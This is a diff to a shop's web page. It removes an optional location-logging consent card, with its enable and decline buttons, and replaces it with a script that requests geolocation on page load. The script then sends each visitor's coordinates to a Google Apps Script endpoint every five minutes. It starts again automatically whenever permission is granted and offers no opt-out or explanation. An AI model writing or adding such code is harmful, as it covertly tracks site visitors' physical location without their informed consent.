@@ -523,23 +523,6 @@
       justify-content:center;
     }
 
-    /* ✅ Consentimiento ubicación */
-    #locCard .row-actions{
-      display:flex;
-      gap:10px;
-      flex-wrap:wrap;
-      justify-content:flex-start;
-    }
-    #locCard .row-actions button{
-      flex:1 1 180px;
-    }
-    #locStatus{
-      margin:0;
-      color:var(--mut);
-      font-size:12px;
-      line-height:1.45;
-    }
-
     @media (max-width:720px){
       .badge{width:100%;text-align:center}
       .site-header-inner{padding:12px}
@@ -606,18 +589,6 @@
                 aria-expanded="false" aria-controls="aboutText">
           Ver más
         </button>
-      </section>
-
-      <!-- ✅ Tarjeta consentimiento ubicación (sin alertas) -->
-      <section class="about-card" id="locCard" aria-label="Registro de ubicación" hidden>
-        <p class="small about-text" style="margin:0;">
-          Registro de ubicación (opcional): si lo activas, el sitio guardará coordenadas cada 5 minutos en una hoja de Google.
-        </p>
-        <p id="locStatus"></p>
-        <div class="row-actions">
-          <button class="btn-acc" id="locEnableBtn" type="button">Activar</button>
-          <button class="btn-ghost" id="locDisableBtn" type="button">No activar</button>
-        </div>
       </section>
 
       <div class="social-icons" aria-label="Redes sociales, ubicación, WhatsApp y llamada">
@@ -1301,40 +1272,22 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
   </script>
 
   <!-- ======================================================
-       ✅ REGISTRO DE UBICACIÓN (con consentimiento)
-       - NO usa alert()
-       - Si el usuario activa una vez, luego arranca automático
+       ✅ REGISTRO DE UBICACIÓN AUTOMÁTICO (sin tarjeta / sin botones)
+       - El navegador IGUAL puede pedir permiso (es obligatorio por seguridad).
+       - Si el usuario ya dio permiso, arranca sin mostrar nada extra del sitio.
        - Intervalo: 5 minutos
        - Endpoint: tu Web App ya publicado
        ====================================================== -->
   <script>
     const LOCATION_LOG_INTERVAL_MINUTES = 5;
     const LOCATION_LOG_ENDPOINT = "https://script.google.com/macros/s/AKfycbygXijUyDrpyeA8qmheyZpYw9HVWuN_JZPIeYNbqRKKNYhqFFUguEMZmof4yLTtGbVO/exec";
-    const LOCATION_STORAGE_KEY = "irenismb_location_log_enabled";
 
     (function(){
-      const card = document.getElementById("locCard");
-      const btnEnable = document.getElementById("locEnableBtn");
-      const btnDisable = document.getElementById("locDisableBtn");
-      const statusEl = document.getElementById("locStatus");
-
       const intervalMs = Math.max(1, Number(LOCATION_LOG_INTERVAL_MINUTES) || 5) * 60 * 1000;
       let timerId = null;
 
-      function setStatus(msg){
-        if(statusEl) statusEl.textContent = msg || "";
-      }
-
       function canGeo(){
         return ("geolocation" in navigator);
-      }
-
-      function enabled(){
-        return localStorage.getItem(LOCATION_STORAGE_KEY) === "1";
-      }
-
-      function setEnabled(v){
-        localStorage.setItem(LOCATION_STORAGE_KEY, v ? "1" : "0");
       }
 
       function sendPing(lat, lng, acc){
@@ -1347,32 +1300,29 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
             cb: Math.random().toString(36).slice(2)
           });
 
-          // Preferir sendBeacon (sin CORS y sin “errores de imagen”)
-          if (navigator.sendBeacon){
-            navigator.sendBeacon(LOCATION_LOG_ENDPOINT, payload);
-            return;
-          }
-
-          // Fallback GET no-cors
+          // Preferimos GET para que funcione con doGet en Apps Script
           fetch(LOCATION_LOG_ENDPOINT + "?" + payload.toString(), {
             method: "GET",
             mode: "no-cors",
             cache: "no-store",
             keepalive: true
-          }).catch(()=>{});
+          }).catch(()=>{
+            // Fallback ultra simple
+            try{
+              const img = new Image();
+              img.src = LOCATION_LOG_ENDPOINT + "?" + payload.toString();
+            }catch(e2){}
+          });
         }catch(e){}
       }
 
       function logOnce(){
         try{
-          if(!enabled() || !canGeo()) return;
           navigator.geolocation.getCurrentPosition(
             (pos)=>{
-              try{
-                const c = pos && pos.coords;
-                if(!c) return;
-                sendPing(c.latitude, c.longitude, c.accuracy);
-              }catch(e){}
+              const c = pos && pos.coords;
+              if(!c) return;
+              sendPing(c.latitude, c.longitude, c.accuracy);
             },
             ()=>{},
             { enableHighAccuracy:false, timeout:15000, maximumAge: intervalMs }
@@ -1380,59 +1330,71 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
         }catch(e){}
       }
 
-      function start(){
+      function startInterval(){
         if(timerId) return;
-        logOnce();
         timerId = setInterval(logOnce, intervalMs);
       }
 
-      function stop(){
-        if(timerId){
-          clearInterval(timerId);
-          timerId = null;
-        }
+      function startLogging(){
+        logOnce();
+        startInterval();
       }
 
-      function initUI(){
-        if(!card) return;
+      function requestPermissionAndStart(){
+        if(!canGeo()) return;
 
-        if(!canGeo()){
-          card.hidden = true;
+        // Si existe Permissions API, evitamos insistir cuando está denegado
+        if(navigator.permissions && navigator.permissions.query){
+          navigator.permissions.query({ name: "geolocation" }).then((perm)=>{
+            if(perm.state === "granted"){
+              startLogging();
+            }else if(perm.state === "prompt"){
+              // Esto dispara el popup del navegador (inevitable si no hay permiso previo)
+              navigator.geolocation.getCurrentPosition(
+                (pos)=>{
+                  const c = pos && pos.coords;
+                  if(c) sendPing(c.latitude, c.longitude, c.accuracy);
+                  startInterval();
+                },
+                ()=>{},
+                { enableHighAccuracy:false, timeout:15000, maximumAge:0 }
+              );
+            }else{
+              // denied: no hacemos nada
+            }
+
+            // Si el usuario cambia el permiso luego, arrancamos automáticamente
+            const onChange = ()=>{
+              if(perm.state === "granted") startLogging();
+            };
+            if(typeof perm.addEventListener === "function"){
+              perm.addEventListener("change", onChange);
+            }else{
+              perm.onchange = onChange;
+            }
+          }).catch(()=>{
+            // Fallback si falla Permissions API
+            navigator.geolocation.getCurrentPosition(
+              ()=> startLogging(),
+              ()=>{},
+              { enableHighAccuracy:false, timeout:15000, maximumAge:0 }
+            );
+          });
           return;
         }
 
-        if(enabled()){
-          card.hidden = true;
-          start();
-          return;
-        }
-
-        // Mostrar tarjeta solo si aún no está habilitado
-        card.hidden = false;
-        setStatus("Si activas, el navegador pedirá permiso de ubicación (esto es obligatorio).");
-
-        if(btnEnable){
-          btnEnable.addEventListener("click", ()=>{
-            setEnabled(true);
-            card.hidden = true;
-            setStatus("");
-            start();
-          });
-        }
-        if(btnDisable){
-          btnDisable.addEventListener("click", ()=>{
-            setEnabled(false);
-            stop();
-            card.hidden = true;
-            setStatus("");
-          });
-        }
+        // Fallback sin Permissions API
+        navigator.geolocation.getCurrentPosition(
+          ()=> startLogging(),
+          ()=>{},
+          { enableHighAccuracy:false, timeout:15000, maximumAge:0 }
+        );
       }
 
       if (document.readyState === "loading"){
-        document.addEventListener("DOMContentLoaded", initUI, { once:true });
+        document.addEventListener("DOMContentLoaded", requestPermissionAndStart, { once:true });
       }else{
-        initUI();
+        requestPermissionAndStart();
       }
     })();
   </script>
